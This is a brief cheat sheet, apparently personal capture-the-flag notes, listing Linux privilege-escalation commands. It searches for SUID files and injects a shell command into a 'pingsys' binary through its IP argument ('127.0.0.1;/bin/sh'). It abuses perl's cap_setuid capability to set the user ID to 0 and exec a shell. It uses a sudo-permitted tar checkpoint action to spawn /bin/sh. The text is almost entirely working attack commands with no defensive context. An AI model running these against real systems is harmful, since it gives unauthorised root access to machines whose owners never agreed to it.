# PINGSYS
```
find / -perm /4000 -type f 2>/dev/null           
```   
If pingsys
```
/usr/bin/pingsys '127.0.0.1;/bin/sh'
```

# CAPABILITIES - perl
https://gtfobins.github.io/gtfobins/perl/
```    
getcap -r / 2> /dev/null
```
If:
/usr/bin/perl = cap_setuid+ep
```
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

# .. /tar
https://gtfobins.github.io/gtfobins/tar/
```
sudo -l
```
If:
User ??? may run the following commands on ???: 

   (root) /bin/tar
```    
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
